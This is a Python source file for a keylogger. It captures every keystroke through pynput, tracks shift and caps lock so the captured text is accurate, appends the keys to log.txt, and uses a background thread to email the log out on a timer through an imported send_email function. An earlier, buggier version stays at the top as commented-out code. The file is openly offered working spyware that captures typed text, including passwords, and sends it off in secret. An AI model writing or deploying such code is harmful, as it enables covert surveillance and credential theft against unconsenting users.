# from pynput.keyboard import Listener
# import threading
# import time
# from emailer import send_email

# # Function to log keystrokes
# def write_to_file(key):
#     letter = str(key).replace("'", "")

#     if letter == 'Key.space':
#         letter = ' '
#     elif letter in ['Key.shift_r', 'Key.ctrl_l']:
#         letter = ''
#     elif letter == 'Key.enter':
#         letter = '\n'
#     elif letter == 'Key.backspace':
#         letter = '[BACKSPACE]'

#     elif hasattr(Key, 'char'):
#         char = Key.char
#         if char is not None:
#             is_shift = Key.shift in pressed_keys or Key.shift_r in pressed_keys
#             is_caps = Key.caps_lock in pressed_keys
#             if char.isalpha() and (is_shift or is_caps):
#                 letter = char.upper()
#             else:
#                 letter = char
#     else:
#         letter = ''  # Ignore other keys like ctrl, alt, etc.

#     with open("log.txt", 'a') as f:
#         f.write(letter)

# def on_press(key):
#     pressed_keys.add(key)
#     write_to_file(key)

# # Track when keys are released
# def on_release(key):
#     if key in pressed_keys:
#         pressed_keys.remove(key)

# # Function to send email every 2 minutes
# def repeat_email():
#     while True:
#         time.sleep(120)
#         send_email()

# # Start email sending thread
# email_thread = threading.Thread(target=repeat_email)
# email_thread.daemon = True  # This lets the thread exit when the main program exits
# email_thread.start()

# # Start keylogger
# with Listener(on_press=write_to_file) as listener:
#     listener.join() 
from pynput.keyboard import Listener, Key
import threading
import time
from emailer import send_email

pressed_keys = set()
caps_on = False  # Track Caps Lock state manually

# Function to write keystrokes to file
def write_to_file(key):
    try:
        is_shift = Key.shift in pressed_keys or Key.shift_r in pressed_keys
        char = ''
        
        if hasattr(key, 'char') and key.char is not None:
            if key.char.isalpha():
                # XOR logic: if either caps_on or shift is pressed (not both), uppercase
                if caps_on ^ is_shift:
                    char = key.char.upper()
                else:
                    char = key.char.lower()
            else:
                char = key.char  # numbers, symbols etc.
        else:
            if key == Key.space:
                char = ' '
            elif key == Key.enter:
                char = '\n'
            elif key == Key.backspace:
                char = '[BACKSPACE]'
            else:
                char = ''  # Ignore other special keys

        with open("log.txt", 'a') as f:
            f.write(char)

    except Exception as e:
        with open("log.txt", 'a') as f:
            f.write(f"[Error: {e}]")

# Key press handler
def on_press(key):
    global caps_on
    pressed_keys.add(key)

    if key == Key.caps_lock:
        caps_on = not caps_on
        return  # Do not log [caps_lock]

    write_to_file(key)

# Key release handler
def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

# Email sending every 2 minutes
def repeat_email():
    while True:
        time.sleep(60)
        send_email()

# Start email sending thread
email_thread = threading.Thread(target=repeat_email)
email_thread.daemon = True
email_thread.start()

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
